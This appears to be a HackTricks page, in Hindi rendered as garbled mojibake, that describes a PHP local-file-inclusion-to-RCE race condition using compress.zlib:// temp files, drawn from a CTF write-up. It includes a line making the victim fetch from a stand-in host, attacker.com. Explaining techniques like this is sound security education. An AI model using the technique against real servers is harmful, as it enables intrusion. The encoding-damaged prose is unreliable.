<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>


## `compress.zlib://` рдФрд░ `PHP_STREAM_PREFER_STDIO`

рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЬреЛ `compress.zlib://` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `PHP_STREAM_PREFER_STDIO` рдлрд╝реНрд▓реИрдЧ рдХреЗ рд╕рд╛рде рдЦреЛрд▓реА рдЧрдИ рд╣реЛ, рдЙрд╕рдореЗрдВ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдбреЗрдЯрд╛ рдХреЛ рдмрд╛рдж рдореЗрдВ рдЙрд╕реА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдирд╛ рдЬрд╛рд░реА рд░рдЦ рд╕рдХрддреА рд╣реИред

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ рдХреЙрд▓ рдЬреИрд╕рд╛:
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВрдЧреЗ рдЬрд┐рд╕рдореЗрдВ http://attacker.com/file рдХреЗ рд▓рд┐рдП рдкреВрдЫрд╛ рдЬрд╛рдПрдЧрд╛, рдлрд┐рд░ рд╕рд░реНрд╡рд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЙрддреНрддрд░ рдПрдХ рдорд╛рдиреНрдп HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рд╛рде рднреЗрдЬреЗрдЧрд╛, рдХрдиреЗрдХреНрд╢рди рдЦреБрд▓рд╛ рд░рдЦреЗрдЧрд╛, рдФрд░ рдХреБрдЫ рд╕рдордп рдмрд╛рдж рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛ рднреЗрдЬреЗрдЧрд╛ рдЬреЛ рднреА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЖрдк php-src рдХреЛрдб рдХреЗ рдЗрд╕ рд╣рд┐рд╕реНрд╕реЗ рдореЗрдВ рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ main/streams/cast.c:
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
## Race Condition рд╕реЗ RCE рддрдХ

[**рдЗрд╕ CTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer) рдХреЛ рдкрд┐рдЫрд▓реЗ рдЯреНрд░рд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

рд╣рдорд▓рд╛рд╡рд░ **рд╡рд┐рдХреНрдЯрд┐рдо рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рдХрдиреЗрдХреНрд╢рди рдЦреЛрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░реЗрдЧрд╛ рдЬреЛ рдЕрдЯреИрдХрд░ рд╕рд░реНрд╡рд░ рд╕реЗ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдкрдврд╝ рд░рд╣рд╛ рд╣реИ** рдЬрд┐рд╕рдореЗрдВ **`compress.zlib`** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

**рдЬрдм** рдпрд╣ **рдХрдиреЗрдХреНрд╢рди** рдореМрдЬреВрдж рд╣реЛрдЧрд╛, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдЯреЗрдореНрдк рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рд░рд╛рд╕реНрддрд╛ рдирд┐рдХрд╛рд▓реЗрдЧрд╛ (рдпрд╣ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд▓реАрдХ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ)ред

**рдЬрдм** **рдХрдиреЗрдХреНрд╢рди** рдЕрднреА рднреА рдЦреБрд▓рд╛ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ LFI рдХрд╛ рд╢рд┐рдХрд╛рд░ рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рд╡рд╣ рдирд┐рдпрдВрддреНрд░рдг рдХрд░рддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╡реЗрдм рд╕рд░реНрд╡рд░ рдореЗрдВ рдПрдХ рдЬрд╛рдВрдЪ рд╣реИ рдЬреЛ **`<?` рд╢рд╛рдорд┐рд▓ рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддреА рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд░ рдПрдХ **Race Condition** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ред рдЬреЛ рдХрдиреЗрдХреНрд╢рди рдЕрднреА рднреА рдЦреБрд▓рд╛ рд╣реИ, рдЙрд╕рдореЗрдВ **рд╣рдорд▓рд╛рд╡рд░** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рд╖реЗрдзрд┐рдд рд╡рд░реНрдгрдХреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж **PHP рдкреЗрд▓реЛрдб рднреЗрдЬреЗрдЧрд╛** рд▓реЗрдХрд┐рди **рд╡реЗрдм рд╕рд░реНрд╡рд░** рдиреЗ **рдЗрд╕рдХреА рд╕рд╛рдордЧреНрд░реА рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ**ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рд░реЗрд╕ рдХрдВрдбреАрд╢рди рдФрд░ CTF рдХрд╛ рд╡рд┐рд╡рд░рдг рджреЗрдЦреЗрдВ [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)
